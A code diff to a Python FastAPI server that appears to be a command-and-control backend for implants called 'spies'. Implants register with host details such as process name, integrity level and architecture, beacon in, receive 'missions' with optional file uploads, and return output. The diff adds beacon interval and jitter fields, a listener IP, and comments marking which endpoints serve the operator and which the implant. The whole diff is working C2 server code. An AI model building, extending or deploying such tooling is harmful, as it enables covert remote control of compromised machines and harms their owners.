@@ -51,9 +51,11 @@ class Spy:
         self.hostname = None
         self.ops = None
         self.pid = None
+        self.missionlist = []
+        self.interval = None
+        self.jitter = None
         self.firstcheckin = None
         self.lastcheckin = None
-        self.missionlist = []
         self.processname = None
         self.integritylevel = None
         self.arch = None
@@ -70,14 +72,16 @@ class Spy:
         self.lastcheckin = self.firstcheckin
         self.processname = processname
         self.integritylevel = integritylevel
+        self.arch = arch
 
-    def checkin(self):
-        self.lastcheckin = datetime.now()
-        if self.mission is not None and self.mission == 'kill':
-            self.active = False
+#    def checkin(self):
+#        self.lastcheckin = datetime.now()
+#        if self.mission is not None and self.mission == 'kill':
+#            self.active = False
 
 class Listener:
-    def __init__(self, type, name, bindport):
+    def __init__(self, ip, type, name, bindport):
+        self.ip = ip
         self.type=type
         self.name=name
         self.bindport=bindport
@@ -111,6 +115,7 @@ listener = []
 
 app = FastAPI()
 
+# (For spy)Register a new spy
 @app.post("/register")
 async def register(request: RegisterRequest):
     newspy = Spy()
@@ -118,6 +123,7 @@ async def register(request: RegisterRequest):
     spies.append(newspy)
     return newspy.__dict__
 
+# 
 @app.post("/beacon")
 async def beacon(request: BeaconRequest):
     spy = next((s for s in spies if s.id == request.id), None)
@@ -132,11 +138,23 @@ async def beacon(request: BeaconRequest):
     raise HTTPException(status_code=404, detail="Spy not found")
 
 
+# (For client)Return all spy data in json
 @app.get("/spies")
 async def list_spies():
     return [spy.__dict__ for spy in spies]
 
 
+# (For client)Return a specified spy data by id
+@app.get("/spy/{spy_id}")
+async def check_in(spy_id: int):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        spy.lastcheckin = datetime.now()
+        return spy.__dict__
+    raise HTTPException(status_code=404, detail="Spy not found")
+
+
+# (For client)Deliver new mission for selected spy
 @app.post("/mission/{spy_id}")
 async def receive_mission(spy_id: int, json_data: str = Form(...), file: UploadFile = None):
     spy = next((s for s in spies if s.id == spy_id), None)
@@ -157,15 +175,9 @@ async def receive_mission(spy_id: int, json_data: str = Form(...), file: UploadF
     raise HTTPException(status_code=404, detail="Spy not found")
 
 
-@app.get("/spy/{spy_id}")
-async def check_in(spy_id: int):
-    spy = next((s for s in spies if s.id == spy_id), None)
-    if spy:
-        spy.lastcheckin = datetime.now()
-        return spy.__dict__
-    raise HTTPException(status_code=404, detail="Spy not found")
 
 
+# (For spy) Upload output by spy id and mission id and remove file content 
 @app.post("/spy/{spy_id}/{mission_id}/output")
 async def update_output(spy_id: int, mission_id: int, request: MissionUpdateRequest):
     spy = next((s for s in spies if s.id == spy_id), None)
@@ -174,11 +186,12 @@ async def update_output(spy_id: int, mission_id: int, request: MissionUpdateRequ
         if mission:
             mission.output = request.output
             mission.iscompleted = True
-            mission.artifact = "Cleared"
+            mission.artifact = "Artifact cleared after the completion"
             return {"message": "Updated output successfully"}
     raise HTTPException(status_code=404, detail="Spy not found")
 
 
+# (For client)Fetch mission output by spy id and mission id
 @app.get("/spy/{spy_id}/{mission_id}/output")
 async def update_output(spy_id: int, mission_id: int):
     spy = next((s for s in spies if s.id == spy_id), None)
